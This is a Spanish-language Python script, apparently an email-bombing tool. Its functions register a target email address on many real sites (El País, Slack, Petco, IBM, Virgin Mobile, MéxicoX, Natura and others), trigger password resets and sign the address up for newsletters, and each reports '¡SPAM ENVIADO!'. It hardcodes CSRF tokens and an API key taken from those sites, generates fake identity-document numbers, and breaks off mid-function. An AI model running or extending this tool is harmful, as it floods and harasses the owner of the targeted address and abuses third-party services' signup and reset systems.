import requests
import random
import json
import urllib.parse
from requests_toolbelt.multipart.encoder import MultipartEncoder
import re

def send_spam_deia(email):
    # Crear el payload con la información para el primer registro (API de Deia)
    payload = {
        "email": email,
        "password": "GEARSOFWAR3@",  # Contraseña predeterminada
        "codigoPostal": "74000",
        "mailPromo": True,
        "acceptPrivacy": True,
        "nombre": "juan",
        "apellido1": "perez",
        "apellido2": "lopez",
        "fechaNacimiento": "2000-01-03",
        "sexo": "H"
    }

    headers_deia = {
        "origin": "https://miperfil.deia.eus",
        "referer": "https://miperfil.deia.eus/deia/auth/registro",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "x-xsrf-token": "eyJpdiI6InJlbWNNSFFod1g4SE5Jbi9SemJ5U0E9PSIsInZhbHVlIjoiUnpOMFdQTEZkdm12UWFPM1pFcjFWWk8xSkFlZU11TS9VREZDQnNCQ0o3cEM0Z0xKWGdYd21NVi9Td1o3MVphMW9YdW9qR2ZPZ1ZveWtOcXZsVjM4czEyUGpzLzFGV3VUcmExMUNHRXZOeFh6bFlwb3ptbEdQYXhvZ0RjalVVc1oiLCJtYWMiOiI5YjhjMmRkZjFhYWY3Yjg1YTMwYjY4NGUyNTE1NzFmZmI1MzFjYTM4YmRiNjM2YTM1NjlmYzIxYTFiNmZjZmU3IiwidGFnIjoiIn0="
    }

    url_deia = "https://miperfil.deia.eus/api/deia/user/create"

    response_deia = requests.post(url_deia, json=payload, headers=headers_deia)

    if response_deia.status_code == 200:
        return f"¡SPAM ENVIADO a {email}!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email}. Intenta nuevamente."

def send_spam_slack(email):
    slack_url = "https://slack.com/api/signup.confirmEmail?_x_id=noversion-1638755455.908"
    headers_slack = {
        "authority": "slack.com",
        "method": "POST",
        "path": "/api/signup.checkEmail?_x_id=noversion-1638755455.764",
        "scheme": "https",
        "accept": "/",
        "content-length": "263",
        "origin": "https://slack.com",
        "referer": "https://slack.com/intl/es-es/get-started",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }
    
    files = {
        "email": (None, email),
        "locale": (None, "es-ES")
    }
    
    response_slack = requests.post(slack_url, headers=headers_slack, files=files)
    
    if response_slack.status_code == 200:
        return f"Correo confirmado en Slack. ¡SPAM ENVIADO a {email}!"
    else:
        return f"Hubo un error al intentar confirmar el correo en Slack para {email}. Intenta nuevamente."

def send_spam_emarketingsd(email):
    # Parámetros a enviar en la solicitud (usamos el correo electrónico proporcionado por el usuario)
    payload = {
        "Nombre": "JUAN",
        "ApellidoP": "PEREZ",
        "ApellidoM": "LOPEZ",
        "Telefono": "(248)+170-9526",  # Número de teléfono
        "Genero": "2",  # 2 para masculino
        "Usuario": email,  # El correo del usuario
        "Contrasena": "Gearsofwar3@",  # Contraseña fija
        "FechaN": "11/11/1998",  # Fecha de nacimiento codificada
        "UrlImagen": "images/avatar12.png"  # Imagen de avatar
    }

    headers_emarketingsd = {
        "origin": "https://salud-digna.org",
        "pragma": "no-cache",
        "referer": "https://salud-digna.org/",
        "sec-ch-ua": '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }

    # URL para realizar la solicitud POST
    url_emarketingsd = "https://api.emarketingsd.org/ConsultaResultados/ConsultaResultados/Registro"

    try:
        # Realizar la solicitud POST con los datos formateados correctamente
        response_emarketingsd = requests.post(url_emarketingsd, data=payload, headers=headers_emarketingsd)
        response_emarketingsd.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        return f"¡SPAM ENVIADO a {email} en eMarketingSD!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el spam a {email} en eMarketingSD: {str(e)}"

def send_recuperar_emarkeyin(user):
    # Definir el payload con los datos que se enviarán
    payload = {
        "Usuario": user,
        "IdFormatoCorreo": "2",
        "Url": "U2FsdGVkX18OZdTP5RjzY/iXhk5lJveZnOJWMRU/U4viIN4/sA7LcIf5fqR7hJ4HVyEFequmd/YtwNboMA4YN00ayq/77RB3dfky51RYoRQbmkh/YJ9rg0ORN7jxAfeXZurrbTOgdKHF2eaR8iLBWX/IEk4lwzZWtXSrRPV9FMNP6ok6EXt3MpC+VW85w0n4fxU3tv6iRjHUGd/0XVA0pYRUwRBVx6FD49UgXmhxGbIqsFOXeUK7JW0JhqIWmua6AtrNISGBMgG0BT2gxmZslirh5MxcHJpX6/KDbDi/kkJlJLGID3A/aVl6OJzE71YPp8vliGO0pzRLcZit6nppag1guijxTbR7Yvq4JyVrdFOd7AkA1Y6LdXb3RC3/qtv1jsVd8SoYJNVzXfLh0lmEXNGSHDL9KQlL0m/Hcv4KFzpt3kq4icvJUBW8buENzzlNzRtznbAWoyhCYN9Qdhpv8wFC/m0bOGqAMsQtWzfa9FjFGtYTpVygvoyYQA/GBepnoUc5Gjd48afs+VQIaNCuejGTu4KED37p8vly318xVDMXadmPfceUn6IwXxNB+l2M",
        "Nombre": "juna",
        "ApellidoP": "perez",
        "ApellidoM": "apellido",
        "Contrasena": "Gearsofwar3"
    }

    # Codificar el payload como application/x-www-form-urlencoded
    payload_encoded = '&'.join([f"{key}={value}" for key, value in payload.items()])

    # Encabezados necesarios para la solicitud
    headers_recuperar_emarkeyin = {
        "authority": "api.emarketingsd.org",
        "method": "POST",
        "path": "/ConsultaResultados/ConsultaResultados/EnviaCorreoRestablecerPass",
        "scheme": "https",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://salud-digna.org",
        "referer": "https://salud-digna.org/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }

    # URL de la API
    url = "https://api.emarketingsd.org/ConsultaResultados/ConsultaResultados/EnviaCorreoRestablecerPass"

    try:
        # Realizar la solicitud POST con los datos formateados correctamente
        response_emarkeyin = requests.post(url, data=payload_encoded, headers=headers_recuperar_emarkeyin)
        
        # Comprobar si la respuesta fue exitosa
        response_emarkeyin.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Correo de restablecimiento enviado a {user}!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el correo de restablecimiento a {user}: {str(e)}"


def send_spam_mexicox(user):
    # Generar números aleatorios para <RANDOMMEXICO1> y <RANDOMMEXICO2>
    random_mexico1 = random.randint(1, 1000)
    random_mexico2 = random.randint(1, 1000)

    # Definir el payload con los datos a enviar
    payload = {
        "email": user,
        "name": "JUAN PEREZ lopez",
        "username": f"JJUAN{random_mexico1}{random_mexico2}SDFS",
        "password": "Gearsofwar3@",
        "level_of_education": "hs",
        "gender": "m",
        "year_of_birth": "1988",
        "mailing_address": "",
        "goals": "",
        "nombres": "JUAN",
        "primer_apellido": "PEREZ",
        "segundo_apellido": "lopez",
        "estado": "21",
        "municipio": "sdf fdfsd",
        "ocupacion": "6",
        "country": "MX",
        "eres_docente": "false",
        "cct": "",
        "funcion": "",
        "nivel_Educativo": "",
        "asignatura": "",
        "terms_of_service": "true",
        "honor_code": "true"
    }

    # Definir los headers necesarios para la solicitud
    headers_mexicox = {
        "origin": "https://mexicox.gob.mx",
        "priority": "u=1, i",
        "referer": "https://mexicox.gob.mx/register?next=%2F",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-csrftoken": "u516jorov3uXqFU3RG52BqCN1KaYjm1wm2NA3DrwmxMALh6L4iqCfVOhIokhUqgz",
        "x-requested-with": "XMLHttpRequest"
    }

    # URL de la API
    url_mexicox = "https://mexicox.gob.mx/api/user/v2/account/registration/"
    try:
        # Realizar la solicitud POST con los datos formateados correctamente
        response_mexicox = requests.post(url_mexicox, data=payload, headers=headers_mexicox)
        
        # Comprobar si la respuesta fue exitosa
        response_mexicox.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡SPAM ENVIADO a {user} en Mexicox!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el spam a {user} en Mexicox: {str(e)}"


def send_spam_lagranbodega(user):
    # Primero, obtener el authenticationToken usando la solicitud GET
    url_gen_token = "https://www.lagranbodega.com.mx/api/vtexid/pub/authentication/start"
    headers_gen_token = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    
    try:
        # Realizar la solicitud GET para obtener el token
        response_token = requests.get(url_gen_token, headers=headers_gen_token)
        response_token.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        # Parsear el JSON para extraer el token
        token_data = response_token.json()
        authentication_token = token_data.get("authenticationToken")

        if not authentication_token:
            return "No se pudo obtener el authenticationToken."

        # Ahora, enviar el correo con el token obtenido
        payload = {
            "authenticationToken": authentication_token,
            "email": user,
            "locale": "es-MX",
            "method": "POST"
        }

        headers_lagranbodega = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "/"
        }

        url_lagranbodega = "https://www.lagranbodega.com.mx/api/vtexid/pub/authentication/accesskey/send"

        # Realizar la solicitud POST con los datos formateados correctamente
        response_lagranbodega = requests.post(url_lagranbodega, data=payload, headers=headers_lagranbodega)
        
        # Comprobar si la respuesta fue exitosa
        response_lagranbodega.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡SPAM ENVIADO a {user} en La Gran Bodega!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el spam a {user} en La Gran Bodega: {str(e)}"



def reset_password_mexicox(user):
    # Primero, obtener el csrftoken usando la solicitud GET
    url_get_mexicox = "https://mexicox.gob.mx"
    headers_get_mexicox = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    try:
        # Realizar la solicitud GET para obtener las cookies
        response_get_mexicox = requests.get(url_get_mexicox, headers=headers_get_mexicox)
        response_get_mexicox.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        # Parsear las cookies para obtener el csrftoken
        csrftoken = response_get_mexicox.cookies.get('csrftoken')
        
        if not csrftoken:
            return "No se pudo obtener el csrftoken."

        # Ahora, enviar la solicitud POST para restablecer la contraseña
        payload_reset_password = {
            "email": user
        }

        headers_reset_password = {
            "origin": "https://mexicox.gob.mx",
            "priority": "u=1, i",
            "referer": "https://mexicox.gob.mx/login?next=%2F",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "x-csrftoken": csrftoken,
            "x-requested-with": "XMLHttpRequest"
        }

        url_reset_password_mexicox = "https://mexicox.gob.mx/account/password"

        # Realizar la solicitud POST para restablecer la contraseña
        response_reset_password_mexicox = requests.post(url_reset_password_mexicox, data=payload_reset_password, headers=headers_reset_password)
        
        # Comprobar si la respuesta fue exitosa
        response_reset_password_mexicox.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Restablecimiento de contraseña solicitado para {user} en Mexicox!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar restablecer la contraseña para {user} en Mexicox: {str(e)}"


def generar_documento():
    # Genera un número aleatorio para el documento
    naturadni = random.randint(1, 9)
    naturadni2 = random.randint(0, 100)
    naturadni3 = random.randint(0, 9)
    return f"564{naturadni}{naturadni2:03d}{naturadni3}"

def enviar_naturacloud(user):
    # Definir la URL y los encabezados para la solicitud
    url_naturacloud = "https://ncf-apigw.prd.naturacloud.com/bff-app-natura-argentina/v2/customers"
    headers_naturacloud = {
        "origin": "https://www.naturacosmeticos.com.ar",
        "priority": "u=1, i",
        "referer": "https://www.naturacosmeticos.com.ar/",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "tenant_id": "argentina-natura-web",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-api-key": "eyM1K146bk3JzO0aBFz32a6A3nWNZi5T2K3xgKEA",
        "x_use_slas": "true"
    }

    # Generar el documento de identidad aleatorio
    documento = generar_documento()

    # Crear el payload con los datos necesarios para la solicitud
    payload_naturacloud = {
        "password": "Gearsofwar3@",
        "email": user,
        "name": "Juan",
        "lastName": "Perez",
        "dateOfBirth": "1999-11-11",
        "gender": 1,
        "phone1": "2481865169",
        "document1": documento,
        "receiveNewsLetter": True,
        "receiveNewsLetterSms": True,
        "allowUsePhoneAndEmail": True,
        "acceptedTerms": True,
        "device": "Mobile"
    }

    try:
        # Realizar la solicitud POST para enviar los datos
        response_naturacloud = requests.post(url_naturacloud, json=payload_naturacloud, headers=headers_naturacloud)
        response_naturacloud.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Registro enviado a {user} en Naturacloud!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el registro a {user} en Naturacloud: {str(e)}"

def enviar_elpais(user):
    # Definir la URL y los encabezados para la solicitud
    url_elpais = "https://publicapi.elpais.com/identity/public/v1/signup"
    headers_elpais = {
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "content-length": "1023",
        "content-type": "application/json",
        "origin": "https://elpais.com",
        "referer": "https://elpais.com/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }

    # Crear el payload para el registro en El País
    payload_elpais = {
        "identity": {
            "userName": user,
            "credentials": "GEARSOFWAR3"
        },
        "profile": {
            "addresses": [],
            "attributes": [
                {"name": "pais_value", "value": "ES", "type": "String"},
                {"name": "region_value", "value": "CR", "type": "String"},
                {"name": "factura_completa", "value": "S", "type": "String"},
                {"name": "origen_value", "value": "susdig", "type": "String"},
                {"name": "prod_value", "value": "SUSDIG", "type": "String"},
                {"name": "arcsite_value", "value": "el-pais", "type": "String"},
                {"name": "cct_value", "value": "0", "type": "String"},
                {"name": "profile_cct_value", "value": "0", "type": "String"},
                {"name": "ccm_value", "value": "0", "type": "String"},
                {"name": "profile_ccm_value", "value": "0", "type": "String"},
                {"name": "newsletter_value", "value": "0", "type": "String"},
                {"name": "backURL_value", "value": "https://elpais.com/suscripciones/", "type": "String"}
            ],
            "contacts": [],
            "displayName": "JUAN",
            "email": user,
            "emailVerified": False,
            "firstName": None,
            "lastName": None,
            "secondLastName": None,
            "birthYear": "1996",
            "birthMonth": "09",
            "birthDay": "16"
        }
    }

    try:
        # Realizar la solicitud POST para enviar el registro
        response_elpais = requests.post(url_elpais, json=payload_elpais, headers=headers_elpais)
        response_elpais.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Registro enviado a {user} en El País!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el registro a {user} en El País: {str(e)}"

def recuperar_naturacloud(user):
    # Definir la URL y los encabezados para la solicitud
    url_recuperar_naturacloud = "https://ncf-apigw.prd.naturacloud.com/bff-app-natura-argentina/customers/account/password-reset-token"
    headers_recuperar_naturacloud = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "content-length": "69",
        "content-type": "application/json",
        "origin": "https://www.naturacosmeticos.com.ar",
        "priority": "u=1, i",
        "referer": "https://www.naturacosmeticos.com.ar/",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "tenant_id": "argentina-natura-web",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-api-key": "eyM1K146bk3JzO0aBFz32a6A3nWNZi5T2K3xgKEA",
        "x_use_slas": "true"
    }

    # Crear el payload para recuperar la cuenta en Naturacloud
    payload_recuperar_naturacloud = {
        "docId": user,
        "channel": "email"
    }

    try:
        # Realizar la solicitud POST para recuperar la cuenta
        response_recuperar_naturacloud = requests.post(url_recuperar_naturacloud, json=payload_recuperar_naturacloud, headers=headers_recuperar_naturacloud)
        response_recuperar_naturacloud.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Recuperación de cuenta solicitada para {user} en Naturacloud!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar recuperar la cuenta para {user} en Naturacloud: {str(e)}"


def enviar_recuperar_elpais_v2(user):
    # Definir la URL y los encabezados para la solicitud
    url_elpais_v2 = "https://publicapi.elpais.com/identity/public/v1/password/reset"
    headers_elpais_v2 = {
        "origin": "https://elpais.com",
        "referer": "https://elpais.com/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }

    # Crear el payload para el restablecimiento de contraseña en El País
    payload_elpais_v2 = {
        "userName": user
    }

    try:
        # Realizar la solicitud POST para enviar el restablecimiento de contraseña
        response_elpais_v2 = requests.post(url_elpais_v2, json=payload_elpais_v2, headers=headers_elpais_v2)
        response_elpais_v2.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en El País!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en El País: {str(e)}"

def registrar_usuario_petco(user):
    # URL para la solicitud POST
    url_post = "https://www.petco.com.mx/petco/en/login/register"
    
    # Datos del formulario (todos los datos son constantes excepto el email)
    data_post = {
        "email": user,  # El correo electrónico del usuario (variable)
        "firstName": "JUAN",  # Nombre del usuario (constante)
        "middleName": "PEREZ",  # Apellido del usuario (constante)
        "mobileNumber": "2481865169",  # Número de teléfono del usuario (constante)
        "pwd": "Gearsofwar3@",  # Contraseña del usuario (constante)
        "checkPwd": "Gearsofwar3@",  # Confirmación de la contraseña (constante)
        "termsOfService": "true",  # Aceptación de los términos del servicio (constante)
        "_termsOfService": "on",  # Aceptación de los términos del servicio (checkbox) (constante)
        "newsletter": "true",  # Suscripción al boletín (constante)
        "_newsletter": "on",  # Suscripción al boletín (checkbox) (constante)
        "CSRFToken": ""  # El token CSRF se deja vacío ya que no lo estamos capturando
    }
    
    # Headers para la solicitud POST
    headers_post = {
        "origin": "https://www.petco.com.mx",
        "referer": "https://www.petco.com.mx/petco/en/login",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        # Realizamos la solicitud POST para registrar al usuario
        response_post = requests.post(url_post, headers=headers_post, data=data_post)
        
        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Registro exitoso de {user} en Petco!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar registrar al usuario {user} en Petco: {str(e)}"



def enviar_suscripcion_axelspringer(user):
    # URL para la solicitud GET
    url_get = f"https://axelspringer.us10.list-manage.com/subscribe/post-json?u=635fc4f516616147c61717656&id=74c16e9a4a&EMAIL={user}&NAME=JUAN&SNAME=PEREZ&c=__jp2"

    # Headers para la solicitud GET
    headers_get = {
        "authority": "axelspringer.us10.list-manage.com",
        "method": "GET",  # No es necesario, requests maneja el método automáticamente
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "referer": "https://www.businessinsider.es/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }

    try:
        # Realizamos la solicitud GET para enviar la suscripción
        response_get = requests.get(url_get, headers=headers_get)

        # Verificamos si la respuesta fue exitosa
        response_get.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Suscripción exitosa de {user} en Axel Springer!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar suscribir a {user} en Axel Springer: {str(e)}"


def enviar_email_ibm(user):
    # URL para la solicitud POST
    url_post = "https://www.ibm.com/account/apis/v2.0/emails/sendemail"

    # Contenido del cuerpo de la solicitud (en formato JSON)
    data_post = {
        "email": user  # El correo electrónico del usuario (variable)
    }

    # Headers para la solicitud POST
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es",
        "content-length": str(len(json.dumps(data_post))),  # El largo del contenido JSON
        "content-type": "application/json",
        "origin": "https://www.ibm.com",
        "referer": "https://www.ibm.com/account/reg/es-es/signup?formid=urx-19774",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "state": "null",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }

    try:
        # Realizamos la solicitud POST para enviar el email
        response_post = requests.post(url_post, headers=headers_post, data=json.dumps(data_post))

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Correo enviado exitosamente a {user} en IBM!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el correo a {user} en IBM: {str(e)}"

def registrar_virgin(user):
    # Definir la URL y los encabezados para la solicitud
    url_virginmobile = "https://app.virginmobile.co/api/securityaccess/users/signup"
    headers_virginmobile = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "content-length": "290",  # Este valor puede cambiar dependiendo del tamaño del payload
        "content-type": "application/json",
        "origin": "https://www.virginmobile.co",
        "referer": "https://www.virginmobile.co/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }

    # Crear el payload para el registro en Virgin Mobile
    payload_virginmobile = {
        "nickname": "juan1223",  # Puedes personalizar este valor si es necesario
        "email": user,  # Email proporcionado por el usuario
        "password": "Gearsofwar3",  # Contraseña por defecto, puedes cambiarla
        "terminosCondiciones": True,
        "politicaDatos": True,
        "originRegister": {
            "id": 1,
            "description": None,
            "name": None
        },
        "channelType": "PORTAL",
        "confirmationAccountUrl": "https://www.virginmobile.co/inicio/activacion-cuenta"
    }

    try:
        # Realizar la solicitud POST para enviar el registro
        response_virginmobile = requests.post(url_virginmobile, json=payload_virginmobile, headers=headers_virginmobile)
        response_virginmobile.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Registro enviado a {user} en Virgin Mobile!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el registro a {user} en Virgin Mobile: {str(e)}"


def start_gandhi_login(user):
    # URL para la solicitud POST para iniciar sesión
    url_startlogin = "https://www.gandhi.com.mx/api/vtexid/pub/authentication/startlogin"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m_startlogin = MultipartEncoder(
        fields={
            "accountName": "gandhi",  # Nombre de cuenta (constante)
            "scope": "gandhi",  # Alcance de la cuenta (constante)
            "returnUrl": "https://www.gandhi.com.mx/checkout/",  # URL de retorno después del inicio de sesión (constante)
            "callbackUrl": "https://www.gandhi.com.mx/api/vtexid/oauth/finish?popup=false",  # URL de callback después de la autenticación (constante)
            "user": user,  # Correo electrónico del usuario (variable)
            "fingerprint": ""  # Huella digital (vacía, se puede añadir más información si es necesario)
        },
        boundary="----WebKitFormBoundaryw4ZaJg1WoJpXwFqh"  # Definir la frontera (boundary) manualmente
    )
    
    # Headers para la solicitud de inicio de sesión (startlogin)
    headers_startlogin = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m_startlogin.content_type  # Definir tipo de contenido adecuado para multipart/form-data
    }

    # Usamos una sesión para manejar cookies
    session = requests.Session()

    try:
        # Realizamos la solicitud POST para iniciar sesión en Gandhi con la sesión
        response_startlogin = session.post(url_startlogin, headers=headers_startlogin, data=m_startlogin)
        
        # Verificamos si la respuesta fue exitosa
        response_startlogin.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        print(f"Inicio de sesión exitoso para {user} en Gandhi.")
        return session  # Retorna la sesión con las cookies guardadas para usarlas en el siguiente paso
    
    except requests.exceptions.RequestException as e:
        print(f"Error al intentar iniciar sesión para {user} en Gandhi: {str(e)}")
        return None  # Si hay un error, retornamos None

def send_gandhi_access_key(user, session):
    if session is None:
        return "No se pudo obtener una sesión válida. El proceso no continuará."

    # URL para la solicitud POST para enviar la clave de acceso
    url_post = "https://www.gandhi.com.mx/api/vtexid/pub/authentication/accesskey/send"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m = MultipartEncoder(
        fields={
            "email": user,  # Correo electrónico del usuario (variable)
            "locale": "es-MX",  # Localización (constante)
            "recaptcha": "",  # Valor recaptcha (vacío)
            "recaptchaToken": ""  # Token recaptcha (vacío)
        },
        boundary="----WebKitFormBoundaryLuIOdkPv5mq4Z2PG"  # Definir la frontera (boundary) manualmente
    )

    # Headers para la solicitud POST para enviar la clave de acceso
    headers_post = {
